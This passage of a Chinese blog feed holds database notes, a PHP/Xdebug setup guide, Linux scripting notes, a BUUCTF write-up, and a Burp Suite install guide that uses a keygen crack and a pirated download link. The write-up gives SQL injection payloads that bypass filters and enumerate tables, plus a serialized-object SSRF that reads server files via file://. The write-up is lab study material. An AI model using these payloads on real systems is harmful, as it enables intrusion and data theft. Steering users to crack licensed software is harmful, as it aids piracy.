数据库系统的组成"></a>1.1.3 数据库系统的组成</h4><p>数据库系统由⽤户、数据库应⽤程序、数据库管理系统和数据库4个部分所组成。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/db/202202231127810.png"></p><ul><li>⽤户</li></ul><p>⽤户可分为最终⽤户和DBA（DataBase Administrator）⽤户两类。</p><p>最终⽤户通过操作数据库应⽤程序处理业务，并利⽤程序存取数据库信息。</p><p>DBA⽤户是⼀ 种专门进⾏数据库管理与运⾏维护的系统⽤户。</p><ul><li>数据库应⽤程序</li></ul><p>数据库应⽤程序是⼀种<font color="#FF5E3A" size="3">在DBMS⽀持下对数据库进⾏访问和处理</font>的应⽤程序。</p><ul><li>数据库管理系统</li></ul><p>数据库管理系统是⼀类⽤于创建、操纵和管理数据库的<font color="#FF5E3A" size="3">系统软件</font>。数据库管理系统与操作系统⼀样都属于系统平台软件。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/db/202202231127811.png"></p><p>操作界⾯层由若⼲管理⼯具和应⽤程序API组 成，它们分别<font color="#FF5E3A" size="3">为⽤户和应⽤程序访问数据库提供接⼝界⾯。</font></p><ul><li>数据库</li></ul><p>数据库是存放系统各类数据的容器。该容器按照⼀定的数据模型组织与存储数据。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/db/202202231127812.png"></p><p>在关系数据库中，数据库元数据、索引数据、运⾏数据等存放在 系统表中，⽤户数据则只能存放在⽤户表中。</p><p>在关系数据库中，<font color="#FF5E3A" size="3">各个关系表的表名称、列名 称、列数据类型、数据约束规则等都是元数据</font>，这些描述数据库结构的数据需要存放在数据库的系统表中。</p><hr><p>注：<a href="https://zhuanlan.zhihu.com/p/77169865">结构化数据、半结构化数据、非结构化数据讲解</a></p><hr><h3 id="1-2-数据库应用系统"><a href="#1-2-数据库应用系统" class="headerlink" title="1.2 数据库应用系统"></a>1.2 数据库应用系统</h3><p>借助数据库进 ⾏信息化处理的计算机应⽤系统被称为数据库应⽤系统。</p><h4 id="1-2-1-数据库应用系统类型"><a href="#1-2-1-数据库应用系统类型" class="headerlink" title="1.2.1 数据库应用系统类型"></a>1.2.1 数据库应用系统类型</h4><ol><li>业务处理系统</li><li>管理信息系统</li><li>决策⽀持系统</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PostgreSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vscode配置PHP开发环境</title>
      <link href="/posts/myh10019.html"/>
      <url>/posts/myh10019.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Vscode配置PHP"><a href="#Vscode配置PHP" class="headerlink" title="Vscode配置PHP"></a>Vscode配置PHP</h2><h3 id="1-本地搭建Apache-PHP-Mysql"><a href="#1-本地搭建Apache-PHP-Mysql" class="headerlink" title="1.本地搭建Apache+PHP+Mysql"></a>1.本地搭建Apache+PHP+Mysql</h3><p>首先本地搭建了Apache+PHP+Mysql，网上有很多教程，具体我找到了两篇比较好的：</p><p><a href="https://blog.csdn.net/m0_46708757/article/details/108653384?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164489677816780366553184%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164489677816780366553184&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-108653384.pc_search_insert_es_download&amp;utm_term=+%E6%9C%80%E6%96%B0%EF%BC%81%EF%BC%81%EF%BC%81Windows10+Apache+php+mysql%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&amp;spm=1018.2226.3001.4187"> 最新！！！Windows10 Apache+php+mysql环境搭建 PHP环境搭建</a></p><p><a href="https://blog.csdn.net/u014095878/article/details/107042936?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164489684116781685340868%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164489684116781685340868&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-107042936.pc_search_insert_es_download&amp;utm_term=windows%E4%B8%8B%E6%90%AD%E5%BB%BAapache+php+mysql+vscode%E7%8E%AF%E5%A2%83%E6%9C%80%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B&amp;spm=1018.2226.3001.4187">windows下搭建apache+php+mysql+vscode环境最详细教程</a></p><h3 id="2-Vscode配置"><a href="#2-Vscode配置" class="headerlink" title="2.Vscode配置"></a>2.Vscode配置</h3><p>网上也有很多这个教程但是都差最后这么一点解释和说明，基本的配置教程：</p><p><a href="https://zhuanlan.zhihu.com/p/359984466">https://zhuanlan.zhihu.com/p/359984466</a></p><p>然后下面介绍一些改变，上面教程都是较老的，新版本的配置需要改动一些方面：</p><h4 id="2-1-Xdebug的配置"><a href="#2-1-Xdebug的配置" class="headerlink" title="2.1 Xdebug的配置"></a>2.1 Xdebug的配置</h4><p>上面教程里也提到了，很多都没说。目前的已经是版本3了，所以配置有如下改变：</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334229.png" style="zoom:150%;"><pre class="line-numbers language-none"><code class="language-none">[xdebug];xdebug3扩展zend_extension = "E:\php\env\php-8.0.3\ext\php_xdebug-3.0.3-8.0-vs16-x86_64.dll";改为自己的路径;xdebug3与xdebug2配置不同，配置参考https://xdebug.org/docs/step_debug#start_with_request;设置debug模式xdebug.mode=debug;激活debugxdebug.start_with_request=yes;允许不同机器访问;xdebug.discover_client_host = false ;远程主机 默认localhost;xdebug.client_host=localhost#远程端口xdebug.client_port = 9000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2插件PHP-Debug的配置"><a href="#2-2插件PHP-Debug的配置" class="headerlink" title="2.2插件PHP Debug的配置"></a>2.2插件PHP Debug的配置</h4><p>下载插件后总是运行不了，报错如下：</p><pre class="line-numbers language-none"><code class="language-none">PHP executable not found. Install PHP and add it to your PATH or set the php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是因为版本升级后，相关配置改变了，之前在setting.json中配置php解释路径如下：</p><pre class="line-numbers language-none"><code class="language-none">"php.validate.executablePath": "E:/php/env/php-8.0.3/php.exe","php.executablePath": "E:/php/env/php-8.0.3/php.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是当前插件需要改变为如下，这个是栽了好长时间的坑，网上也没有相关纠正：</p><pre class="line-numbers language-none"><code class="language-none">"php.debug.executablePath": "D:\\httpd\\PHP\\php.exe","php.validate.executablePath": "D:\\httpd\\PHP\\php.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-3launch-json配置"><a href="#2-3launch-json配置" class="headerlink" title="2.3launch.json配置"></a>2.3launch.json配置</h4><p>点击创建launch.json会自动生成相关的配置，但是其中的Xdebug端口号可能是9003，记得改为上面Xdebug的远程端口号。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334231.png"></p><h3 id="3-如何调试"><a href="#3-如何调试" class="headerlink" title="3 如何调试"></a>3 如何调试</h3><p>在Vscode中调试有两种方式，一个就是在编辑器中调试，还有一种就是远程调试。</p><h4 id="3-1-Launch-currently-open-script"><a href="#3-1-Launch-currently-open-script" class="headerlink" title="3.1 Launch currently open script"></a>3.1 Launch currently open script</h4><p>就是调试目前打开的脚本文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334233.png"></p><p>这样就可以一步一步调试了。下面有对应的调试控制台显示对应的输出。</p><h4 id="3-2-Listen-for-Xdebug"><a href="#3-2-Listen-for-Xdebug" class="headerlink" title="3.2 Listen for Xdebug"></a>3.2 Listen for Xdebug</h4><p>就是通过监听端口使用Xdebug调试。这里有关Xdebug的原理和相关说明如下：</p><p><a href="https://segmentfault.com/a/1190000011332021">https://segmentfault.com/a/1190000011332021</a></p><p><a href="https://blog.csdn.net/qq_43615820/article/details/106409289">https://blog.csdn.net/qq_43615820/article/details/106409289</a></p><p>从上面介绍可以知道我们设置的9000端口只是编辑器Vscode和浏览器的一个<font color="red" size="3">通信端口</font>，并不是我们要访问的如：localhost:9000/test.php。</p><p>所以我们要进行调试访问的页面还是服务器地址如：localhost/test.php(默认80端口，根据自己配置的端口进行修改)。</p><h5 id="3-2-1-打开-Listen-for-Xdebug"><a href="#3-2-1-打开-Listen-for-Xdebug" class="headerlink" title="3.2.1 打开 Listen for Xdebug"></a>3.2.1 打开 Listen for Xdebug</h5><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334234.png"></p><p>此时可以发现还没有进入到调试状态，处于监听端口中。</p><h5 id="3-2-2-访问页面"><a href="#3-2-2-访问页面" class="headerlink" title="3.2.2 访问页面"></a>3.2.2 访问页面</h5><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334235.png"></p><p>可以看到并没有进入到这个页面中去，这里可能会使小白疑惑，难道配置错了？</p><p>并不是，这时候已经开始调试了，但会Vscode页面可以看到可以调试了：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334236.png"></p><p>调试到哪一步结束，浏览器就会呈现到哪一步！不过再次刷新就是原来内容了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说配置了一天吧，来来回回查相关教程和报错信息，最后还是官方文档好用，特别是执行路径那里，毕竟插件版本会升，相关配置难免会有变化，所以教程最好跟着官方文档来。</p><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334237.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf练习：31-40</title>
      <link href="/posts/myh10018.html"/>
      <url>/posts/myh10018.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="31-网鼎杯-2018-Fakebook"><a href="#31-网鼎杯-2018-Fakebook" class="headerlink" title="31.[网鼎杯 2018]Fakebook"></a>31.[网鼎杯 2018]Fakebook</h2><p>这个题考察的还是比较好的，细细研究一下。考察的主要是SQL注入，SSRF读取文件，union select知识点。</p><p>首先随便注册个账号，这个博客必须是地址，好像有个<code>.</code>就行。然后就登陆进去了。这是可以看到用户名是可以点的，眼要好使😉：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040181.png"></p><p>点进去进入到view.php就是自己的信息界面，但是发现后面有个参数，那就试试注入，<code>1'</code>出现报错就存在SQL注入，直接给出相关payload:</p><pre class="line-numbers language-none"><code class="language-none">2 order by 4 #2 union select 1,2,3,4# ——被过滤了东西显示 :no back~_~2 union/**/select 1,2,3,4 # 显示第二位2 union/**/select 1,database(),3,4 #  fakebook2 union/**/select 1,table_name,3,4 from information_schema.tables where table_schema='fakebook' #  ——users记住语法：from是在字段的后面！！！2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users' #  ——返回no,username,passwd,data，就是自己注册的信息2 union/**/select 1,data,3,4 from users #     ：O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:5:"1.com";} 自己信息的序列化内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注入到这里并没有什么flag，只有自己的信息，但是这个data是有用的。再从页面返回的内容找信息：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040183.png"></p><p>发现存在<code>unserialize()</code>函数以及<code>getBlogContent()</code>函数，大致就可以猜到会有一个类<code>UserInfo</code>，把用户信息存储为一个对象，然后再进行序列化存储到data字段里。然后读取blog内容之前会先进行反序列化，然后调用对象的<code>getBlogContent()</code>函数。这里就可以猜测，如果我们要读取flag，可能试试利用这个读取函数，如果存在SSRF的话。</p><p>这里其实就可以猜测存在flag.php，然根据上面的路径，构造如下试一试：</p><pre class="line-numbers language-none"><code class="language-none">O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么payload就如下：</p><pre class="line-numbers language-none"><code class="language-none">2 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码确实得到了flag：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040184.png"></p><p>其实这里存在运气，因为不确定flag在哪以及是否存在SSRF漏洞。这时可以试试diresearch扫描下目录，会发现robots.txt和flag.php，说明就在这个目录。同时打开robot.txt发现了类的源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> getBlogContents <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> isValidBlog <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现<code>curl_exec()</code>导致ssrf漏洞，没有进行任何过滤。同时也发现了类的构造。然后payload是一样的。</p><p>其实在使用：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用了mysql的union select特性，前面的文章讲过，在数据不存在时，会增加虚拟数据：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040185.png"></p><p>这样我们才可以查询我们构造的，否则数据库里没有那个data，查也查不到的。</p><p>最后看了别的师傅的wp，发现另一种简单的方法：</p><pre class="line-numbers language-none"><code class="language-none">2 union/**/select 1,user(),3,4 #  root@localhost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询数据库当前用户的身份，发现是root，然后就可以使用<code>load_file('/var/www/html/flag.php')</code>函数直接读取文件数据了！🤩</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040186.png"></p><h2 id="32-GXYCTF2019-BabyUpload"><a href="#32-GXYCTF2019-BabyUpload" class="headerlink" title="32.[GXYCTF2019]BabyUpload"></a>32.[GXYCTF2019]BabyUpload</h2><p>这个题重复了哈，和之前的26题 <a href="https://huhu-myh.github.io/posts/myh10012.html#toc-heading-6">[MRCTF2020]你传你🐎呢</a> 是一样的思路，解题都一样，就不多说咧。</p><p>题目源码：<a href="https://github.com/imagin-sch/GXY_CTF/tree/master/Web/babyupload">https://github.com/imagin-sch/GXY_CTF/tree/master/Web/babyupload</a></p><hr><p>题目逐渐加难，不冲不行咧🤪</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131042058.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp_suite安装使用</title>
      <link href="/posts/myh10017.html"/>
      <url>/posts/myh10017.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Burp-Suite-Pro-v2022-1-1的安装"><a href="#Burp-Suite-Pro-v2022-1-1的安装" class="headerlink" title="Burp_Suite_Pro_v2022.1.1的安装"></a>Burp_Suite_Pro_v2022.1.1的安装</h2><p>Burp_Suite的使用范围还是比较广的，可以拦截包、修改包等，我目前的应用就是做web题的时候用到。这次介绍的是一个吾爱大佬发的汉化专业破解版，源地址：<a href="https://www.52pojie.cn/thread-1585838-1-1.html">https://www.52pojie.cn/thread-1585838-1-1.html</a></p><h3 id="1、软件地址"><a href="#1、软件地址" class="headerlink" title="1、软件地址"></a>1、软件地址</h3><p>链接：<a href="https://pan.baidu.com/s/1g5NuI1x0BbfiL_nM-xjKqQ">https://pan.baidu.com/s/1g5NuI1x0BbfiL_nM-xjKqQ</a><br>提取码：burp</p><h3 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h3><p>首先解压，压缩包里已经集成了对应的java环境，所以不需要自己配置了，但是需要生成对应的许可证。</p><h4 id="2-1-打开burp-loader-keygen-2020-1-jar"><a href="#2-1-打开burp-loader-keygen-2020-1-jar" class="headerlink" title="2.1 打开burp-loader-keygen-2020_1.jar"></a>2.1 打开burp-loader-keygen-2020_1.jar</h4><p>打开这个需要Java工具，自己电脑如果没有配置Java环境，需要自己配置一下环境变量，具体的教程网上有很多，就是添加一下对应的环境变量。</p><p>然后打开cmd使用如下命令：</p><pre class="line-numbers language-none"><code class="language-none">java -jar burp-loader-keygen-2020_1.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/tools/202202121945716.png"></p><p>这样就可以打开我们神奇的密钥生成器了，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/tools/202202121945718.png"></p><h4 id="2-2-手动安装"><a href="#2-2-手动安装" class="headerlink" title="2.2 手动安装"></a>2.2 手动安装</h4><p>先把Lisense输入到许可证框里，然后点击手动解密验证。</p><p>接着把出现的Request那一长串字符串粘贴到上图中的对应Request位置。</p><p>然后就会出现对应的Response，再把它粘贴我们的软件中就破解成功咧！</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/tools/202202121945719.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Burp_suite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第九章</title>
      <link href="/posts/myh10016.html"/>
      <url>/posts/myh10016.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第九章：构建基本脚本"><a href="#第九章：构建基本脚本" class="headerlink" title="第九章：构建基本脚本"></a>第九章：构建基本脚本</h2><h3 id="9-1-使用多个命令"><a href="#9-1-使用多个命令" class="headerlink" title="9.1 使用多个命令"></a>9.1 使用多个命令</h3><p>shell脚本的关键在于<font color="#FF5E3A" size="3">输入多个命令并处理每个命令的结果</font>，甚至需要将一个命令的结果传给另一个命令。 shell可以让你将多个命令串起来，一次执行完成。  </p><p>如果要<font color="#FF5E3A" size="3">两个命令一起运行</font>，可以把它们放在同一行中，彼此间用<strong>分号</strong>隔开：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">myh@VM-16-11-debian:~$ <span class="token function">date</span><span class="token punctuation">;</span><span class="token function">who</span>Wed 09 Feb <span class="token number">2022</span> 08:15:29 PM HKTmyh      pts/1        <span class="token number">2022</span>-02-09 <span class="token number">20</span>:00 <span class="token punctuation">(</span><span class="token number">120.242</span>.132.71<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这就是个简单的脚本，只用到了两个bash shell命令。  </p><p>这种技术对于小型脚本尚可，但它有一个很大的缺陷：每次运行之前，你都必须在命令提示符下输入整个命令。可以将这些<font color="#FF5E3A" size="3">命令组合成一个简单的文本文件</font>，这样就不需要在命令行中手动输入了。在需要运行这些命令时，只用运行这个文本文件就行了。  </p><h3 id="9-2-创建-shell-脚本文件"><a href="#9-2-创建-shell-脚本文件" class="headerlink" title="9.2 创建 shell 脚本文件"></a>9.2 创建 shell 脚本文件</h3><p>在创建shell脚本文件<code>touch test.sh</code>时，<font color="#FF5E3A" size="3">必须在文件的第一行指定要使用的shell</font>。其格式为：  </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在通常的shell脚本中，井号（ #）用作注释行。 shell并不会处理shell脚本中的注释行。然而，shell脚本文件的第一行是个例外， #后面的惊叹号会告诉shell用哪个shell来运行脚本。  </p><p>在指定了shell之后，就可以在文件的每一行中输入命令，然后加一个回车符：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">!</span>/bin/bash<span class="token comment"># This script displays the date and who's logged on</span><span class="token function">date</span><span class="token function">who</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以根据需要，使用分号将两个命令放在一行上，但在shell脚本中，你可以在独立的行中书写命令。 shell会按根据命令在文件中出现的顺序进行处理。  </p><p>现在脚本就变写好了。如果直接运行结果可能不太好：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ test1bash: test1: <span class="token builtin class-name">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一个障碍是让bash shell能找到你的脚本文件。 shell会通过PATH环境变量来查找命令。快速查看一下PATH环境变量就可以弄清问题所在。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/user/bin <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>让shell找到test1脚本，只需采取以下两种作法之一：   </p><ul><li> 将shell脚本文件所处的目录添加到PATH环境变量中；</li><li> 在提示符中用绝对或相对文件路径来引用shell脚本文件。  </li></ul><p>在这个例子中，我们将用第二种方式将脚本文件的确切位置告诉shell。记住，为了引用当前目录下的文件，可以在shell中使用单点操作符。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./test1bash: ./test1: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>shell指明了还没有执行文件的权限。快速查看一下文件权限就能找到问题所在：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> -l test1-rw-rw-r-- <span class="token number">1</span> user user <span class="token number">73</span> Sep <span class="token number">24</span> <span class="token number">19</span>:56 test1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 下一步是通过chmod命令（参见第7章）赋予文件属主执行文件的权限 :</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># chmod 760 test1.sh</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ./test1.sh</span>Wed 09 Feb <span class="token number">2022</span> 08:36:03 PM HKTmyh      pts/1        <span class="token number">2022</span>-02-09 <span class="token number">20</span>:00 <span class="token punctuation">(</span><span class="token number">120.242</span>.132.71<span class="token punctuation">)</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -l</span>total <span class="token number">12</span>-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">0</span> Jan <span class="token number">25</span> <span class="token number">14</span>:28 cho-rw-r--r-- <span class="token number">1</span> root root <span class="token number">22</span> Jan <span class="token number">25</span> <span class="token number">14</span>:29 makefile-rwxrw---- <span class="token number">1</span> root root <span class="token number">21</span> Feb  <span class="token number">9</span> <span class="token number">20</span>:33 test1.sh-rw-r--r-- <span class="token number">1</span> myh  root <span class="token number">76</span> Feb  <span class="token number">8</span> <span class="token number">20</span>:32 test1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-3-显示消息"><a href="#9-3-显示消息" class="headerlink" title="9.3 显示消息"></a>9.3 显示消息</h4><p><code>echo</code>命令可以显示文本消息来告诉脚本用户脚本正在做什么:</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">!</span>/bin/bash<span class="token comment"># This script displays the date and who's logged on</span><span class="token builtin class-name">echo</span> This is a test.<span class="token function">date</span><span class="token function">who</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    默认情况下，不需要使用引号将要显示的文本字符串划定出来。但有时在字符串中出现引号的话需要用另外一种来将字符串划定起来。        